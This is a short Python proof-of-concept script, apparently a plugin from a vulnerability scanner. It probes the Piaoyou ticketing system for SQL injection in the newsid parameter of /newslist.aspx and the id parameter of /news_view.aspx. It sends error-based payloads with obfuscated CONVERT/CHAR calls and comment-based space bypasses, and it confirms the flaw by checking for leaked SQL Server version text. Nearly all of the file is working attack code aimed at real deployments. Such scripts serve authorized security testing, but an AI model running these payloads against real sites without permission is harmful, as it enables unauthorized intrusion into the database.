#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 票友票务系统通用sql注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0128207
author: Lucifer
description: 文件/newslist.aspx中,参数newsid存在SQL注入。
             文件/news_view.aspx中,参数id存在SQL注入。
'''
import sys
import requests



class piaoyou_newsview_list_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/newslist.aspx?newsid=1Or/**/1=CoNvErT(InT,(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN))--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                return "[+]存在票友票务系统通用sql注入漏洞...(高危)\tpayload: "+vulnurl

            vulnurl = self.url + "/news_view.aspx?id=1Or/**/1=CoNvErT(InT,(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN))--"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                return "[+]存在票友票务系统通用sql注入漏洞...(高危)\tpayload: "+vulnurl
        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = piaoyou_newsview_list_BaseVerify(sys.argv[1])
    testVuln.run()